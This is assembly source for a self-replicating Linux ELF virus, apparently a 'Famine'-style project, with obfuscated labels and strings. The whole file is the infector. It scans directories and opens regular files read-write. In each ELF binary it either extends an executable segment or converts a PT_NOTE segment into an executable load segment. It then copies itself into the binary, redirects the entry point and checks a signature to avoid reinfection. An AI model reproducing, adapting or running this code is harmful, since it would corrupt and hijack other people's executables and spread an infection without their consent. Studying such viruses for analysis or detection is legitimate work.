%include "famine.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing famine on the stack
push rbp
mov rbp, rsp
PUSHA
lea rdi, [rel yysh6dM]     ; dir to open for arg readDir
mov rsi, xuxpS29EBk
call RvIznIzU

lea rdi, [rel aNLyfep]
mov rsi, KUsbjjdu
call RvIznIzU
DDKWytkFlg:
POPA
mov rsp, rbp
pop rbp
gvSO5iiw:
jmp vWRd7

; take directory to open in rdi && size of pwd on rsi
RvIznIzU:
push rbp
mov rbp, rsp
sub rsp, famine_size
lea r8, FAM(famine.fd)
or qword [r8], -1
lea r8, FAM(famine.pwdPtr)
mov [r8], rdi
lea r8, FAM(famine.lenghtPwd)
mov [r8], rsi
mov rax, 2
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
jl eEh6rXG
lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
mov [rdi], rax

iCNAYlG:
lea r10, FAM(famine.fd)
mov rdi, [r10]
lea r9, FAM(famine.total_read)              ; init total_read
mov DWORD[r9], 0 
mov rax, 217; getdents64(int fd, void *buf, size_t size_buf) 
lea rsi, FAM(famine.dirents)
mov rdx, 0x1000
syscall
cmp rax, 0 
jle eEh6rXG

lea r10, FAM(famine.dirents_struct_ptr)  ; r10 -> (struct famine.diretents_struct_ptr)
mov [r10], rsi                           ; famine.dirents_struct_ptr -> famine.dirents
lea r11, FAM(famine.total_to_read)       ; r11 -> (struct famine.total_to_read)
mov DWORD [r11], eax ; famine.total_to_read = getdents total length 

cpWumA:
lea r8, FAM(famine.total_read)        ; r8 -> total lu de getdents
lea r9, FAM(famine.total_to_read)        ; r9 -> total a lire de getdents
mov r10, FAM(famine.dirents_struct_ptr)  ; r10 -> actual dirent struct
lea r11, FAM(famine.dirents_struct_ptr)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] ; r12 = length de la stuct dirents actuelle 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; famine.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8; verifie le type du fichier 
jne VMEvDhU

mAvYTwW:
lea rsi, [r10 + D_NAME] ; charge le nom du fichier dans rsi 
mov byte [rsi - 1], '/'
sub rsi, FAM(famine.lenghtPwd)
mov rdi, FAM(famine.pwdPtr)
call lXjx5cjAW

yuTUL34X:
call sgNnqBr

VMEvDhU:
mov r8, FAM(famine.total_read)
mov r12, FAM(famine.total_to_read)
cmp r8d, r12d                   ; if (total lu >= total getdents)
jge iCNAYlG
jmp cpWumA

sgNnqBr:
push rbp
mov rbp, rsp
sub rsp, infection_size
lea rax, INF(infection.injection_offset)
mov qword [rax], 0 
lea rax, INF(infection.add_page)
mov byte [rax], 0 
lea rax, INF(infection.mem_eof)
mov qword [rax], 0 

W5Ta3n4:
mov rax, 2
mov rdi, rsi
mov rsi, 0x0002
xor rdx, rdx
syscall
cmp rax, 0x0 
jl odL2dz7l
mov INF(infection.file_fd), rax

; === get file size ===
sN2XQWUXl:
mov rax, 8
mov rdi, INF(infection.file_fd)
mov rsi, 0x0 
mov rdx, 0x2
syscall
cmp rax, 0x0 
jle NYRgNe6tg
mov INF(infection.map_size), rax
mov INF(infection.original_end), rax

f0dTdrZNI:
; rax -> map
mov rsi, rax        ; rsi = file_size
mov rax, 9
mov rdi, 0x0 
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl NYRgNe6tg
lea r8, INF(infection.map_addr)
mov [r8], rax

lY07DF6q3D:
cmp dword [rax + 1], 0x02464c45 ; if != 'ELF64' 
jne nO7WO

q9tCy4TBs5:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx
R24pcud:
cmp cx, [r15  + elf64_ehdr.e_phnum]
jge IhS8eKnenz 
add r14, elf64_phdr_size
inc rcx
jmp R24pcud
IhS8eKnenz:
mov INF(infection.last_seg_hdr_addr), r14
xor r9, r9
GWXK2n1:
cmp cx, 0 
jle Iz3GCfS
aNOam7avaL:
bt word [r14], 0 ; is segment header's first bit != 0 
jnc Vjn7j3qP
bt qword [r14], 0x20 ; is segment header's 33rd bit == 1 
jc qFfbFYvgoX
Vjn7j3qP:
dec rcx
sub r14, elf64_phdr_size
jmp GWXK2n1

Iz3GCfS:
mov r9, INF(infection.injection_offset)
cmp r9, 0 
je nO7WO
cmp byte INF(infection.add_page), 1 ; if new page needed jump _add page 
je Ef91fO4LJY
jmp MjoCsg          ; else jmp MjoCsg

qFfbFYvgoX:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
u7Xjju:
; r8 -> potential iPoiU3
; r9 == iPoiU3 variable
mov r8, r15
add r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
sub r8, z67UWs1
mov r9, [rel iPoiU3]
cmp qword r9, [r8]
je nO7WO

DKfM3C6wCj:
mov r9, INF(infection.injection_offset)
test r9, r9
jz ThEBfMMYa7
mov r9, INF(infection.add_page)
test r9, r9
jz Vjn7j3qP

ThEBfMMYa7:
; r8 == end of infection offset
; r9 == next segment offset
mov r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, elf64_phdr_size
add r9, elf64_phdr.p_offset
cmp [r9], r8
setb INF(infection.add_page)   ; if ([r9] < r8) { infection.add_page = 1) }

FduYnY:
; r8 -> infection structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (ThEBfMMYa7)
;*r14 -> segment header in header table
lea r8, INF(infection.seg_nb)
mov [r8], cl
lea r8, INF(infection.original_entry)
mov r12, [r15 + elf64_ehdr.e_entry]
mov [r8], r12
lea r8, INF(infection.injection_offset)
mov [r8], r13
lea r8, INF(infection.injection_addr)
push r9
mov r9, [r14 + elf64_phdr.p_vaddr]
add r9, [r14 + elf64_phdr.p_memsz]
mov [r8], r9
pop r9
lea r8, INF(infection.seg_hdr_addr)
mov [r8], r14
jmp Vjn7j3qP

Ef91fO4LJY:
QZwxfzhlWA:
mov rax, 77
mov rdi, INF(infection.file_fd)
lea rsi, INF(infection.map_size)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl nO7WO

Uvl6UfH:
mov rdi, INF(infection.map_addr)
mov rax, 11
syscall

gI8z3A:
mov rax, 9
mov rdi, 0x0 
mov rsi, INF(infection.map_size)    ; rsi = file_size
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl NYRgNe6tg
lea r8, INF(infection.map_addr)
mov [r8], rax

vPZEdeXeG:
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_shnum]
add r14, [r14 + elf64_ehdr.e_shoff]
xor rcx, rcx

WmYuNgTU:
cmp rcx, rax
jge fK8O0PQUS
mov rbx, [r14 + elf64_shdr.sh_addr]
add rbx, [r14 + elf64_shdr.sh_size]
cmp INF(infection.mem_eof), rbx
jge sLESfVx
mov INF(infection.mem_eof), rbx

sLESfVx:
add r14, elf64_shdr_size
inc rcx
jmp WmYuNgTU

fK8O0PQUS:

G5ltbxxe:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_phnum]
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx

aQ6AOAG:
cmp rcx, rax
jge sdGOY7
cmp dword [r14 + elf64_phdr.p_type], 0x4
je IAJFY4LcC6

MxRtBxlfe:
add r14, elf64_phdr_size
inc rcx
jmp aQ6AOAG

sdGOY7:
mov r14, -1 ; detect if no note found. See IAJFY4LcC6 line 1 

IAJFY4LcC6:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl ltCCFCgVd
mov dword [r14 + elf64_phdr.p_type], 0x1
mov qword [r14 + elf64_phdr.p_flags], 0x1| 0x4
mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_align], 0x1000 
mov rax, INF(infection.original_end)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + elf64_phdr.p_offset], rax
mov qword INF(infection.injection_offset), rax
mov rax, INF(infection.mem_eof)
add rax, 0x1000 
and rax, -4096
mov qword INF(infection.injection_addr), rax
mov qword [r14 + elf64_phdr.p_vaddr], rax
mov qword [r14 + elf64_phdr.p_paddr], rax

MjoCsg:
HTZH6y587:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(infection.map_addr)
add r8, elf64_ehdr.e_entry
mov r10, INF(infection.injection_addr)
mov [r8], r10
cmp byte INF(infection.add_page), 0 
jg Btua9
mov rdi, CODE_LEN 
call V8jKwK8RlJ

Btua9:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (f8VFWQAA - _start)
mov rdi, INF(infection.map_addr)
add rdi, INF(infection.injection_offset)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN ; counter will decrement 
cld          ; copy from _start to f8VFWQAA (= !std)
rep movsb

ltCCFCgVd:
; r8 -> gvSO5iiw instruction's addr (gvSO5iiw + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(infection.map_addr)
add r8, INF(infection.injection_offset)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(infection.injection_addr)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(infection.original_entry)
sub r9, r10
mov [r8], r9d
jmp nO7WO

V8jKwK8RlJ:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(infection.seg_hdr_addr)
push r8           ; save header start for later

; * Update file size *
add r8, qword elf64_phdr.p_filesz
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, elf64_phdr.p_memsz
add qword [r8], rdi

ret

nO7WO:
lea rdi, INF(infection.map_addr)
lea rsi, INF(infection.map_size)
mov rax, 11
syscall
jmp NYRgNe6tg

NYRgNe6tg:
mov rax, 3
mov rdi, INF(infection.file_fd)
syscall
mov qword INF(infection.file_fd), -1
jmp odL2dz7l

eEh6rXG:
mov rdi, FAM(famine.fd)
cmp rdi, 0 
jle odL2dz7l
mov rax, 3
syscall
or qword FAM(famine.fd), -1
jmp odL2dz7l

odL2dz7l:
leave
ret

vWRd7:
mov rax, 60 
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
lXjx5cjAW:
xor rcx, rcx
fsc20U1:
cmp byte [rdi + rcx], 0 
je e9g8sA1
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp fsc20U1

e9g8sA1:
; mov byte [rsi + rcx], 0 
ret

; debug
; strlen(str:rsi)
ZpVGipHB6:
xor rcx, rcx

XueEw4xz:
cmp byte [rsi + rcx], 0 
je Q2uqjZJmC
inc rcx
jmp XueEw4xz

Q2uqjZJmC:
mov rax, rcx
ret


yysh6dM db "lW/_V", 0 
xuxpS29EBk    equ $ - yysh6dM
aNLyfep db "lW/_Vp", 0 
KUsbjjdu    equ $ - aNLyfep
iPoiU3 db "B/VNV G0,MbZV^Ak&Gb AT+ &Mo]O", 0x0 
z67UWs1 equ $ - iPoiU3
f8VFWQAA: 